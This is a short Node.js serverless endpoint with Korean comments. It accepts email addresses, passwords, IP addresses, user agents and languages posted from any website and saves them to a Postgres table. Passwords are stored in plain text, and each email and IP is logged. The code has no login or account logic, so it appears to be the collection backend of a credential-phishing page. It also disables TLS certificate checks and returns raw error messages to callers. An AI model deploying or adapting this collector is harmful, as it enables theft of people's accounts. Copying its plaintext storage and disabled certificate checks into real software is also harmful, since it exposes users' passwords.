const { Pool } = require('pg');

const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method === 'POST') {
        const { email, password, ip, user_agent, language } = req.body;

        if (!email || !password) {
            return res.status(400).json({ success: false, message: '이메일과 비밀번호를 입력해주세요.' });
        }

        try {
            // 1. 테이블이 없다면 생성
            await pool.query(`
                CREATE TABLE IF NOT EXISTS users (
                    id SERIAL PRIMARY KEY,
                    email TEXT,
                    password TEXT,
                    ip TEXT,
                    user_agent TEXT,
                    language TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                );
            `);

            // 2. 누락된 컬럼 안전 추가
            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS ip TEXT;`);
            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS user_agent TEXT;`);
            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS language TEXT;`);

            // 3. 데이터베이스에 정보 저장
            const query = `
                INSERT INTO users (email, password, ip, user_agent, language) 
                VALUES ($1, $2, $3, $4, $5)
            `;
            await pool.query(query, [
                email, 
                password, 
                ip || null, 
                user_agent || null, 
                language || null
            ]);

            console.log(`[Neon DB 저장 성공] 이메일: ${email} / IP: ${ip}`);

            return res.status(200).json({ 
                success: true, 
                message: '데이터가 성공적으로 저장되었습니다.' 
            });

        } catch (error) {
            console.error('Neon DB 에러 상세:', error);
            return res.status(500).json({ 
                success: false, 
                message: '데이터베이스 저장 중 오류가 발생했습니다.', 
                error: error.message 
            });
        }
    } else {
        res.setHeader('Allow', ['POST', 'OPTIONS']);
        return res.status(405).end(`Method ${req.method} Not Allowed`);
    }
};